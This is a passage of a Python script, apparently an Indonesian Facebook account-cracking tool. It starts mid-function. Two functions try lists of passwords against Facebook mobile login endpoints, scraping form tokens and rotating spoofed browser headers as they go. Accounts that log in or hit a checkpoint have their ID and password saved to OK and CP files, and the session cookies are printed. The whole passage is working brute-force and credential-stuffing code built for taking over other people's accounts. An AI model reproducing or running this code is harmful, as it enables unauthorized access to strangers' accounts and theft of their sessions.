ted&_rdr')
			dataa ={
            "lsd":
            re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            "uid":idf,
            "next":f"https://"+url+"/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1701149946772%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16ca8a297d92d4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df1a0326eb8ef6a4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4132f483d7f18%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%2526frame%253Df15caec7a8001dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4132f483d7f18%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff294ef620828698%26relation%3Dopener%26frame%3Df15caec7a8001dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
            "flow":"login_no_pin",
            "pass":pw,
            }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
            'Host': url,
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="111"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'origin': f'https://'+url,
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'XMLHttpRequest',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://'+url+'/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1701149946772%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16ca8a297d92d4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df1a0326eb8ef6a4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4132f483d7f18%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%2526frame%253Df15caec7a8001dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4132f483d7f18%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff294ef620828698%26relation%3Dopener%26frame%3Df15caec7a8001dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            }
			po = ses.post(f'https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}{P}[ {K}CP {P}] {K}{idf}|{pw}{N}')     
				#os.popen("play-audio .cp.mp3")
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}{P}[ {H}OK {P}] {H}{idf}|{pw}\n{kuki}{N}')
				#os.popen("play-audio .ok.mp3")
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice(['🤡','🗿','😫'])
	sys.stdout.write(f"\r[{bo}] {P}[{P}{loop}{P}/{P}{len(id)}{P}]/{P}[{H}{ok}{P}]/{P}[{K}{cp}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update
			({
			"Host": "m.facebook.com",
			"cache-control": "max-age=0",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1683937216736%26e2e%3D%257B%2522init%2522%253A1683937216736%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dc04ec754-b74c-4b96-86f2-9e235efbdb70%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f1ac14ee-4676-4055-8e8c-6d37af51004b3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522g5ucodih711g4ihmi5pj%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df1ac14ee-4676-4055-8e8c-6d37af51004b3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f1ac14ee-4676-4055-8e8c-6d37af51004b3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522g5ucodih711g4ihmi5pj%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0', 'unrecognized_tries': '0',
			'email': idf,
			'pass': pw,
			'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1683937216736%26e2e%3D%257B%2522init%2522%253A1683937216736%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dc04ec754-b74c-4b96-86f2-9e235efbdb70%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f1ac14ee-4676-4055-8e8c-6d37af51004b3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522g5ucodih711g4ihmi5pj%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df1ac14ee-4676-4055-8e8c-6d37af51004b3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f1ac14ee-4676-4055-8e8c-6d37af51004b3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522g5ucodih711g4ihmi5pj%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}{P}[ {K}CP {P}] {K}{idf}|{pw}{N}')     
				#os.popen("play-audio .cp.mp3")
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}{P}[ {H}OK {P}] {H}{idf}|{pw}\n{kuki}{N}')
				#os.popen("play-audio .ok.mp3")
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
######## [ AYAM GAJAGO ] ########
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMPZ')
	except:pass
	login()
######## [ AYAM JAGO BANGETT KKKKK ] ########